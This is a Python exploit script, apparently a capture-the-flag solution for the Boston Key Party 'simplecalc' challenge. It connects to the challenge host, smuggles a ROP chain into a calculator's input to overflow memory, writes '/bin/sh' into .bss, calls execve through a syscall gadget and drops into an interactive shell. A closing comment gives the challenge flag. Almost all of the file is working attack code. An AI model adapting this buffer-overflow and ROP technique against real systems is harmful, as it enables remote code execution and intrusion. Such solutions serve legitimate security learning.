#!/usr/bin/python
import os, sys, socket
import struct
import telnetlib

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

def conn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('simplecalc.bostonkey.party',5400))
    #s.connect(('127.0.0.1', 1337))
    f = s.makefile('w', bufsize=0)
    return s, f

#convert addr to math operation
def c(addr):
  if addr > 1234:
    return "1\n"+str(addr-1234)+"\n1234\n"
  else:
    return "2\n"+str(addr+1234)+"\n1234\n"

def readuntil(f, delim='\n'):
  data = ''
  while not data.endswith(delim):
    data += f.read(1)
  return data

def interact():
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

s, f = conn()

#0x90909090
nop = "1\n2425392062\n1234\n"

#0x0
zero = "2\n1234\n1234\n"


#ROP Chain -- execve(0x6c2c40, 0, 0)
#pop rdx,ret
#0x68732f6e69622f
#pop rdi, ret
#0x6c2c40 <<.bss is not randomized and is RW->>
#mov [rdi], rdx; ret
#pop rdx, ret
#0
#pop rsi, ret
#0
#pop rax, ret
#0x3b
#syscall 

#because not PIE, executable isn't fully randomized in all sections
#and we get lot of gadgets

#pop_rdi_ret       = 0x0000000000401b73
#pop_rsi_ret       = 0x0000000000401c87
#pop_rdx_ret       = 0x0000000000437a85
#pop_rax_ret       = 0x000000000044db34
#syscall_ret       = 0x00000000004648e5
#mov_[rdi]_rdx_ret = 0x0000000000400aba

payload  = "43\n"
payload += nop*12
payload += zero*2 #free(0)
payload += nop*4  

#now, let's rop
payload += c(0x437a85)    #pop rdx ; ret #overwrite sra
payload += zero           #pop rdx ; ret
payload += c(0x6e69622f)  #nib/
payload += c(0x68732f)    #\0sh/
payload += c(0x401b73)    #pop rdi ; ret
payload += zero           #pop rdi ; ret
payload += c(0x6c2c40)    #.bss address
payload += zero
payload += c(0x400aba)    #mov qword ptr [rdi], rdx ; ret
payload += zero           #mov qword ptr [rdi], rdx ; ret
payload += c(0x437a85)    #pop rdx ; ret
payload += zero           #pop rdx ; ret
payload += zero*2
payload += c(0x401c87)    #pop rsi ; ret
payload += zero           #pop rsi ; ret
payload += zero*2
payload += c(0x44db34)    #pop rax ; ret
payload += zero           #pop rax ; ret
payload += c(0x3b)
payload += zero
payload += c(0x4648e5)    
payload += zero           #syscall
payload += "5\n"


readuntil(f, 'Expected number of calculations: ')
f.write(payload)

interact()

s.close()

#cat key
#BKPCTF{what_is_2015_minus_7547}
